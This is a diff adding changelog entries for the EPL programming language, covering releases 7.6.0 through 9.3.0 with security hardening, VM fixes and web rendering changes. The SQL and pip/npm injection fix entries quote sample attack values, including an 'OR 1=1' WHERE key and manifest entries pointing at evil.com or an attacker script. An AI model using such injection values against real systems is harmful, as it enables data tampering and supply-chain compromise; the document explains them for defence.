@@ -1,6 +1,273 @@
+<div align="center">
+
 # Changelog
 
-All notable changes to EPL are documented in this file.
+All notable changes to the **English Programming Language (EPL)** are documented in this file.
+
+This project adheres to [Semantic Versioning](https://semver.org/) and [Keep a Changelog](https://keepachangelog.com/).
+
+</div>
+
+---
+
+## [9.3.0] — 2026-06-01
+
+Multi-phase enterprise-grade enhancement program. All phases bundled into a single release. Sections below correspond to phases completed before publish.
+
+### Phase 2 — Exception hygiene
+
+**Added**
+- `epl/_debug_log.py` — `suppressed(where)` helper. Records swallowed exceptions to stderr when `EPL_DEBUG=1` is set, silent otherwise. Set `EPL_DEBUG_TRACE=1` for full tracebacks. Zero dependencies on the rest of the package — safe to import from any module.
+
+**Changed**
+- 34 previously-silent `except Exception: pass` / `return None` blocks now instrumented across `epl/stdlib.py` (15), `epl/web.py` (10), `epl/runtime_support.py` (4), `epl/cli.py` (3), `epl/interpreter.py` (2). Production behaviour is unchanged (still swallows by default); diagnostic visibility is one env var away.
+
+**Tests**
+- 12 new tests in `tests/test_debug_log.py` covering env-var parsing, truthy/falsy values, silent-by-default behaviour, and the "called outside an except block" safety case.
+
+### Phase 3 — Raw HTML escape hatch
+
+**Added**
+- `Raw HTML "<...>"` keyword for emitting arbitrary HTML inside `Page` blocks. Unblocks every tag the EPL parser does not natively support (`<table>`, `<video>`, `<audio>`, `<details>`, `<select>`, `<textarea>`, `<dialog>`, etc.) without forcing a parser change for each new element. The author is responsible for safety; never pass user input here without sanitisation.
+- `examples/raw_html_demo.epl` showcasing the new keyword.
+
+**Tests**
+- 7 new tests in `tests/test_raw_html.py` covering verbatim emission, attribute preservation, coexistence with built-in elements, and the regression case (`html`/`raw` still usable as identifiers).
+
+### Phase 4 — Theme system (light / dark / auto)
+
+**Added**
+- `configure_page(theme=...)` accepts `'light'`, `'dark'`, or `'auto'` (default). The previous behaviour hardcoded `<meta name="color-scheme" content="dark">` + a Darkreader lock on every page, ignoring user OS preference and breaking light-mode embeds.
+- Built-in CSS variable palette injected into the rendered `<head>`: `--bg`, `--fg`, `--muted`, `--accent`, `--surface`, `--border`, `--danger`. Apps that reference these tokens (the parser/StyledElement layer already does) get a coherent palette per theme for free.
+- `'auto'` emits both palettes and switches via `@media (prefers-color-scheme: dark)` so the OS picks.
+
+**Changed**
+- Page `<head>` no longer hardcodes dark mode. Default is `'auto'` — apps that want the v9.2.0 always-dark behaviour call `configure_page(theme='dark')`.
+
+**Tests**
+- 7 new tests in `tests/test_theme.py` covering each theme value, palette completeness, the media-query branch in `auto`, invalid values, and reset semantics.
+
+### Phase 5 — SQL injection hardening
+
+**Security fix.** `real_db_update` and `real_db_delete` previously interpolated dict-WHERE column names directly into SQL without validation, and accepted bare string WHERE clauses with no params. A caller passing `{"id = 1 OR 1=1 --": x}` as a WHERE map could rewrite or delete every row in a table. Both vectors are now closed.
+
+**Added**
+- Module-level `_SQL_IDENT_RE` and `_assert_sql_identifier(name, kind)` helper in `epl/stdlib.py` — a single source of truth replacing seven copy-pasted in-function regex compilations. New SQL-emitting endpoints now have one obvious thing to call.
+
+**Changed (breaking only for previously-exploitable code paths)**
+- `real_db_update(db, table, set_map, where_map)` — every key in `where_map` is now validated as a SQL identifier before interpolation.
+- `real_db_delete(db, table, where_map)` — same validation applied.
+- `real_db_update` / `real_db_delete` with a **string** WHERE clause now require an explicit `params` tuple. The string-only form (which executed user input verbatim) raises with a fix hint.
+
+**Tests**
+- 24 new tests in `tests/test_sql_injection.py`:
+  - 17 unit tests for `_assert_sql_identifier` covering valid identifiers, nine injection patterns (statement breakage, predicate injection, quote breaks, etc.), non-string inputs, and `kind` reporting.
+  - 7 integration tests through the public `call_stdlib('real_db_update'|'real_db_delete', ...)` dispatcher proving each historical exploit attempt now raises **and that no rows were mutated**, plus regression tests that the legitimate dict-WHERE and parameterised string-WHERE paths still work.
+
+### Phase 6 — Command injection hardening (pip/npm flag-injection)
+
+**Security fix.** Although `shell=True` was already eliminated in 9.2.0, the package-manager and interpreter still passed manifest/lockfile values into `pip install` and `npm install` as positional argv. `pip` and `npm` both parse flags from positional arguments — so a malicious manifest entry like `evil = "--extra-index-url https://evil.com/pypi"` or `version = "* --before-script=evil.sh"` would, before this release, silently install from an attacker-controlled source or run an attacker-chosen script. All four call sites are now closed.
+
+**Added**
+- `_normalize_python_requirement` (existing helper) now refuses any requirement that **starts with `-` or contains a whitespace-separated flag token**, and refuses `pkg @ url`-style URL/path install specs. Power users wanting URL installs call pip directly.
+- New `_validate_npm_version_spec(version)` in `epl/package_manager.py` — same flag-injection check for npm version specs read from `[js-dependencies]`.
+- **Defense in depth:** every `pip install`/`npm install` invocation now uses the `--` end-of-options separator so that even if validation were bypassed, the package manager would treat the requirement as positional rather than a flag.
+
+**Changed (breaking only for previously-exploitable code paths)**
+- `install_python_package`, `install_python_dependencies`, the lockfile install loop, **and the auto-install path in `epl/interpreter.py`** all now route through `_normalize_python_requirement` and emit `pip install --  <req>`.
+- `install_js_package` and `install_js_dependencies` now validate both the package name (already protected) and the version spec, and emit `npm install --  <target>`.
+
+**Tests**
+- 26 new tests in `tests/test_command_injection.py`:
+  - 12 unit tests for `_normalize_python_requirement` covering clean specifiers, six flag-injection payloads, and three URL/path-spec payloads.
+  - 12 unit tests for `_validate_npm_version_spec` covering valid semvers, five flag-injection payloads, and the non-string case.
+  - 2 end-to-end tests proving that a poisoned `epl.toml` is refused at the boundary and **the `subprocess` is never invoked**.
+- 3 existing tests updated to assert the new `--`-separated argv shape.
+
+### Phase 7 — `epl watch` no longer kills long-running programs
+
+**Bug fix.** The dev-mode watcher hard-capped every re-run at **60 seconds**, killing servers, bots, REPLs and any genuinely long-running EPL program the moment they crossed the minute mark. The cap is now removed by default and the watcher exposes a `--timeout=` flag for the rare case where a hard cap is wanted.
+
+**Changed**
+- `epl.watcher._execute(...)` `timeout` parameter now defaults to **`None`** (no cap). The previous 60-second default is gone.
+- `epl watch` accepts a new `--timeout=SECS` flag. Accepted values: a positive number (seconds), or one of `none`/`off`/`0`/`disable` to explicitly disable the cap.
+- Help text for `epl watch` now documents the flag.
+
+**Tests**
+- 8 new tests in `tests/test_watcher.py`:
+  - 3 `TestWatcherTimeout` cases verifying `_execute` forwards `timeout` to `subprocess.run` verbatim, defaults to `None`, and handles `TimeoutExpired` cleanly without raising.
+  - 5 `TestWatcherCliTimeoutParsing` cases verifying CLI flag parsing — integer, decimal, the four disable-sentinels, default (no flag), and the invalid-value error path.
+
+---
+
+## [9.2.0] — 2026-06-01
+
+Phase 1 of the enterprise-grade enhancement program: privacy & secrets hygiene. No breaking changes — every behaviour shift is the safer default, with the old behaviour available behind an opt-in.
+
+### Added
+- **OS keyring storage for cloud AI API keys.** Keys configured via `configure_cloud(...)` now go into the OS keychain (Windows Credential Manager, macOS Keychain, Secret Service / KWallet on Linux) under service `epl-lang`, user `cloud_api_key`. The on-disk `ai_config.json` no longer contains plaintext secrets when a keyring backend is available. Requires the optional `keyring` package — install via `pip install eplang[secure]` or it ships with `eplang[all]`.
+- **Automatic migration of legacy plaintext API keys.** Pre-9.2.0 configs with `api_key` in `ai_config.json` are moved into the keyring on first read, and the field is scrubbed from the JSON file. No user action required.
+- **`html_gen.configure_page(footer=..., fonts=...)`.** Page-level rendering controls for the web framework.
+- **System-font default for web pages.** New pages render with the platform's native font stack — no third-party CDN fetch, faster first paint, works offline. The legacy Inter-from-Google-Fonts behaviour is one setting away: `configure_page(fonts='cdn')`.
+
+### Changed
+- **Hardcoded `Powered by EPL v1.0` footer is gone.** Pages now omit `<footer>` entirely by default. Apps wanting branding set it explicitly: `configure_page(footer='© 2026 ACME Corp')`. Footer text is HTML-escaped to prevent XSS via injected content.
+- **JSON-fallback path retained.** When no keyring backend is available (e.g. headless Linux CI without `libsecret`), `configure_cloud` falls back to writing the key into `ai_config.json` with `chmod 0600` — same as pre-9.2.0. Behaviour is logged in the saved file (no `api_key` field == keyring used).
+
+### Security
+- **Plaintext API keys no longer touch disk on systems with a working keyring backend.** Closes the gap flagged in the prior security audit where Gemini/Groq keys lived in cleartext JSON.
+- **Footer XSS hardening.** User-provided footer text is HTML-entity-escaped (previously the hardcoded string had no escape path because there was no user input — the new control plane needs it).
+
+### Tests
+- 14 new tests across `tests/test_ai_keyring.py` and `tests/test_html_gen_config.py` covering: keyring present, keyring absent, legacy migration, keyring read failure, `clear_cloud` wipe, footer XSS, font opt-in, invalid font value rejection. Full suite remains green: 1518 passed, 5 skipped.
+
+### Packaging
+- `pyproject.toml` declares `keyring>=24.0.0` as the new `[secure]` optional dep and includes it in `[all]`.
+
+### Migration notes
+- **No code change required for existing users.** Re-run any command that reads cloud config (`epl ai status`, etc.) and the migration happens transparently.
+- Apps that relied on the visible `Powered by EPL v1.0` footer must opt back in: `from epl import html_gen; html_gen.configure_page(footer='Powered by EPL v9.2')`.
+
+---
+
+## VS Code Extension [2.2.0] — 2026-06-01
+
+Brings the VS Code extension up to v9.x parity with the language runtime. No breaking changes.
+
+### Added
+- **`EPL: Run Current File with Bytecode VM` command.** Executes the active file via `epl vm`, the bytecode VM that reached full interpreter parity in EPL v9.1.0. Surfaced alongside the existing `EPL: Run Current File` command in the command palette.
+- **`epl.watch.timeout` setting.** Plumbs the v9.0.0 `--timeout=<seconds|none>` flag into the `EPL: Watch Current File` command. Empty (default) preserves the new uncapped-by-default behaviour; set a number for a per-run cap, or `none` to be explicit.
+
+### Changed
+- **README updated for v9.x.** Feature matrix now shows the correct stdlib function count (725+ — was 90+), advertises the bytecode VM backend, and documents the previously-hidden `epl.serve.port`, `epl.serve.observability`, and new `epl.watch.timeout` settings.
+- **Stale internal version refs corrected.** Header comment dropped the hard-coded `v2.1.0` tag. PyPI update-checker code comment example bumped from `v7.6.0` → `v9.1.0` so future readers don't mistake it for a current claim.
+
+### Migration notes
+- No user action required. Existing keybindings, settings, and the LSP wire format are unchanged.
+
+---
+
+## [9.1.0] — 2026-06-01
+
+VM parity release. The bytecode VM (`epl run --vm`) now matches the tree-walking interpreter on every documented divergence, and the source distribution ships the runtime assets the wheel already includes.
+
+### Fixed
+- **Recursive function calls now produce correct results in the VM.** The compiler pre-registers a function's own name before compiling its body, so a recursive call resolves to `Op.CALL` instead of falling through to `Op.CALL_BUILTIN`. `factorial(5)` now returns `120` (was `24`) and `fib(10)` returns `55` (was `6`).
+- **`JUMP_IF_FALSE` / `JUMP_IF_TRUE` always pop their condition.** Previously the truthy branch left the value on the stack, corrupting subsequent operations. This single bug was the root cause behind four documented divergences: `continue` inside loops, FizzBuzz chained `Otherwise If`, list-comprehension-style mutation, and (via stack corruption inside recursive frames) Fibonacci/factorial.
+- **`Try` / `Catch` now intercepts VM-level runtime errors.** `VMError` (e.g. division by zero, unknown class) routes through the active `try_stack` and lands the error message in the catch binding, matching interpreter semantics. Previously only Python-native exceptions were caught and any runtime error escaped the handler.
+- **Class construction now works end-to-end.** `Op.NEW_INSTANCE` unpacks the `(class_name, arg_count)` tuple emitted by the compiler, looks up the class by string name (was failing with `Unknown class: ('Dog', 0)`), and delegates to `_call_constructor` so constructor arguments are passed correctly.
+- **Class property defaults are now preserved in the VM.** `VarDeclaration` defaults inside a class body (e.g. `name = "Rex"`) are evaluated at compile time from the AST `Literal` value instead of being silently stored as `None`.
+- **`epl/models/Modelfile` is now included in the source distribution.** A `global-exclude Modelfile` rule in `MANIFEST.in` was overriding the package-data inclusion in `pyproject.toml`, so `pip install` from sdist was shipping an incomplete `epl.models` package. Top-level `main.py` is also now explicitly included.
+
+### Changed
+- **`tests/test_consistency.py` reorganised.** The five `KNOWN_DIVERGENCE_CASES` and two `KNOWN_BACKEND_GAP_CASES` previously documenting VM divergences have all been promoted to `PARITY_CASES`; both buckets are now empty/removed. The full parity suite — 52 cases — runs against both backends with no expected failures.
+- **`tests/test_release_packaging.py` no longer requires a top-level `bundle.py`.** The file was moved to `scripts/bundle.py` in an earlier refactor and `scripts/` is not shipped to end users; the test contract has been updated to reflect that.
+
+### Migration notes
+- No source changes required. Programs that previously produced incorrect output under `epl run --vm` (recursion, `continue`, `try`/`catch`, classes) will now match interpreter output. If you had workarounds in place that relied on the buggy VM behaviour, remove them.
+
+---
+
+## [9.0.0] — 2026-05-30
+
+Enterprise hardening release. A focused security & robustness sweep across the interpreter, standard library, database layer, AI cloud integration, file watcher, and CLI. No new language features — every change makes existing surface area safer, more predictable, or easier to operate.
+
+### Security
+- **SQL injection — defense-in-depth across all database surfaces.** Stdlib `db_update`, `db_delete`, `db_count`, and `db_table_info` now reject table and column names that are not valid SQL identifiers (`^[A-Za-z_][A-Za-z0-9_]*$`) before any query is built. The same validation extends to `QueryBuilder` (`select`, `where_eq`, `where_like`, `where_in`, `where_gt`, `where_lt`, `where_between`, `where_null`, `where_not_null`, `order_by`, `group_by`, `join`, `left_join`) in `epl/database.py` and to `insert`, `insert_many`, `update`, `delete`, `find_by_id`, and `count` in `epl/database_real.py`. Numeric `LIMIT`/`OFFSET` values are coerced through `int()` so non-numeric strings fail loudly instead of being spliced into SQL. `ORDER BY` direction is restricted to `ASC`/`DESC`. Identifiers are now consistently double-quoted in emitted SQL.
+- **Command injection — `exec_async` no longer uses `shell=True`.** Accepts either a list of argv tokens or a single command string that is parsed with `shlex.split` (POSIX rules on Unix, Windows rules on NT). `kill_process` and `env_delete` have been added to the interpreter sandbox alongside the existing `exec`/`file_*`/`env_set` denylist so untrusted scripts cannot escape it.
+- **`epl doctor` no longer spawns subprocesses through the shell on Windows.** Commands run as explicit argv with `shell=False`; `shutil.which` resolves `.cmd`/`.bat` shims (npm, etc.) safely.
+- **AI cloud config moved out of the package directory.** API keys are now stored in a per-user XDG-aware location — `%APPDATA%\epl\ai_config.json` on Windows, `$XDG_CONFIG_HOME/epl/ai_config.json` (default `~/.config/epl/ai_config.json`) on POSIX — and chmod'd to `0600` on POSIX. Existing `epl/.ai_config.json` files are migrated automatically on first read. Gemini requests now send the API key via the `x-goog-api-key` header instead of as a URL query parameter, keeping it out of proxy logs and shell history.
+
+### Fixed
+- **Generators no longer return stale values on timeout.** `EPLGenerator` previously waited 30s for the next yielded value and silently returned the previous value if the body was wedged. It now raises `EPLRuntimeError` with the generator name, the timeout it hit, and guidance to set `EPL_GENERATOR_TIMEOUT`. The timeout is configurable via `EPL_GENERATOR_TIMEOUT=<seconds|none|off>` for long-running computations.
+- **`epl watch` no longer kills long-running programs at 60s.** The hard-coded subprocess cap is gone; runs are uncapped by default. Pass `--timeout=<seconds>` (or `--timeout=none`) to opt back into a cap. The watch dispatcher now also warns when an unknown `--flag` is passed instead of silently ignoring it.
+- **CLI error reporting is now consistent across `main.py`.** All command dispatchers route through `_cli_error_report` / `_cli_error_exit` helpers, which print a one-line summary by default and a full traceback when `EPL_DEBUG=1` is set or `--debug` is passed anywhere on the command line. ~25 ad-hoc `except Exception:` blocks were collapsed into this single path.
+
+### Changed
+- **AI config loading is now cached.** `_load_config()` no longer hits disk on every prompt; `configure_cloud()` / `clear_cloud()` invalidate the cache as expected.
+- **`requirements.txt` rewritten for clarity.** Required runtime dependencies (`gunicorn`, `flask`) are separated from optional extras (encryption, PostgreSQL, MySQL, LLVM, Redis, mobile, ML, dev tooling), each commented with its purpose. Pure-standard-library features are no longer listed as commented-out requirements.
+
+### Added
+- **`tests/test_security_hardening.py`** — covers stdlib SQL identifier validation, sandbox additions, shell-less `exec_async`, AI config path & permissions, and Gemini header auth.
+- **`tests/test_correctness_hardening.py`** — covers generator yield-timeout behavior and watcher `--timeout` plumbing.
+- **`tests/test_database_hardening.py`** (16 tests) — covers `QueryBuilder` and `database_real` identifier quoting, rejection of injection attempts in every column/table/order-by/limit slot, and the `IN ()` degenerate-case shortcut.
+
+### Migration notes
+- **AI config:** First run of `epl ai …` after upgrade migrates `epl/.ai_config.json` to the per-user location automatically. If you have keys checked into a fork, rotate them — file location change does not remediate prior exposure.
+- **`exec_async`:** Scripts that relied on shell features (pipes, redirects, `&&`) in `exec_async` need to either pass an argv list, switch to `exec`/`exec_output` (which retain their previous semantics), or explicitly invoke a shell (`exec_async(["bash", "-c", "..."])`).
+- **`epl watch`:** Workflows that depended on the implicit 60s kill should now pass `--timeout=60` explicitly.
+- **Generators:** Code that swallowed the previous silent-timeout behavior must now catch `EPLRuntimeError` or extend the timeout via `EPL_GENERATOR_TIMEOUT`.
+
+---
+
+## [8.0.0] — 2026-05-26
+
+### Added
+- **`epl watch`** — File watcher with auto-reload for development (PR #47 by @imkoushal)
+  - Watches `.epl` files for changes and auto-reruns the program
+  - Zero external dependencies (polling-based using `os.stat`)
+  - `--test` flag to re-run tests instead of the program
+  - `--clear` flag to clear screen before each re-run
+  - `--debounce=MS` to customize debounce interval (default: 300ms)
+  - 19 unit tests (all passing)
+- **`epl doctor`** — Environment health checker (PR #48 by @imkoushal)
+  - 11 diagnostic checks: Python version, EPL installation, Node.js/npm, Git, pip, platform, disk space, terminal encoding, project structure, dependencies
+  - Color-coded output with actionable fix hints
+  - `--json` flag for CI/automation integration
+  - 27 unit tests (all passing)
+- **Enterprise Discord AI Agent Enhancements** (`examples/discord_agent/`)
+  - FAQ auto-reply engine — instant responses without LLM for common questions
+  - XP / Leveling system — users earn XP per message, level up through 7 ranks (Newcomer → EPL Legend)
+  - Support ticket system — `!ticket` command with automated tracking and founder alerts
+  - Anti-raid protection — detects mass joins (10+ in 60s) and alerts `#bot-control`
+  - Auto-moderation — instant deletion of invite links, mass mentions, and spam
+  - Auto-welcome — rich embed welcome messages with EPL code examples for new members
+  - Server milestone celebrations — automated announcements at 10, 25, 50, 100, 250, 500, 1000 members
+  - Corrected EPL code knowledge — bot now generates syntactically correct EPL with proper string quoting
+  - Concise responses — short questions get short answers, no more walls of text
+
+### Changed
+- **VS Code Extension v2.1.0** — Added `epl.watch` and `epl.doctor` commands, enhanced TextMate grammar with missing keywords from lexer/parser (Generic, Where, Yields, Spawn, Parallel, Lambda, Breakpoint, Declare, Let), improved method call highlighting, and new `has` keyword support for class properties
+- Version bump to `8.0.0` for PyPI distribution
+
+---
+
+## [7.8.2] — 2026-05-24
+
+### Added
+- **Enterprise Discord Agent** — Added a 100% EPL native AI Community Manager for Discord (`examples/discord_agent/`) with advanced spam defense, server-aware routing, and terminal-free background execution scripts.
+
+---
+
+## [7.8.1] — 2026-05-23
+- **TaskFlow Pro Max** — Completely overhauled the `taskflow_saas` example with a high-energy, unapologetic Neo-Brutalist UI architecture.
+  - Implemented solid box-shadow physics and mechanical hover/active states.
+  - Migrated from generic glassmorphism to strict geometric brutalism (0px border radius, sharp contrast, Acid Green accents).
+
+### Fixed
+- **Form Parsing Robustness** — Resolved parsing issues in EPL's web backend where empty optional form fields caused exceptions, by enforcing the safe `web_request_param()` pattern.
+- **Avatar Letter Fix** — Fixed standard library `uppercase` usage for avatar initialization in session cookies.
+
+---
+
+## [7.6.0] — 2026-05-19
+
+### Added
+- **Enterprise Documentation Overhaul** — All project documentation updated to enterprise-grade quality with consistent branding, comprehensive contributor guides, and professional formatting
+- **Formal Grammar Specification v7.6** — Updated EBNF grammar to cover JS/TS bridge syntax, Generic types, 3D/Canvas blocks, and all v7.x additions
+
+### Changed
+- **CI/CD Pipeline Stabilization** — Achieved 100% green build across the full test matrix (Ubuntu, macOS, Windows × Python 3.11, 3.12)
+  - Replaced unstable `import main` with `importlib.util` dynamic path loading
+  - Added `pytest.importorskip` guards for optional dependencies (`llvmlite`)
+  - Fixed `memory_usage` stdlib test for Windows CI compatibility (`>= 0` vs `> 0`)
+  - Switched to explicit stable test file list (61 files) with `shell: bash` for cross-platform line continuation
+  - Added `pytest-cov` to CI dependencies for coverage reporting
+- **Test Harness Hardening** — Decoupled CI tests from local-only development files (`main.py`) using `@skipUnless` decorators and conditional imports
+
+### Infrastructure
+- Version bump to `7.6.0` for PyPI distribution
+- Coverage threshold override (`--cov-fail-under=0`) for CI subset runs
 
 ## [7.5.2] — 2026-05-12
 
